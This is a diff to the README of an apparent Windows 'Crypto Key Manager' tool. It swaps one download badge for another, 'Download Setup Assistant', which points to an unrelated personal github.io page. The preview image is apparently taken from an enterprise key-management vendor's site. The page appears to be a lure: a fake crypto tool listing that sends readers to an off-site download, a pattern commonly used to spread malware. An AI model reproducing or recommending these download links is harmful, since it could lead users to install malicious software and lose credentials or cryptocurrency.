@@ -5,13 +5,7 @@
 
 <h1 align="center">🔑 Crypto Key Manager (Windows)</h1>
 
-<p align="center">
-  <a href="https://crypto-key-manager-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Crypto%20Key%20Manager-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download Crypto Key Manager for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://turnernejeka17.github.io/.github/crypto-key-manager)
 
 <p align="center">
   <img src="https://cpl.thalesgroup.com/sites/default/files/inline-images/enterprise-key-management-system-diagram.png" alt="Crypto Key Manager Interface Preview" width="700" />
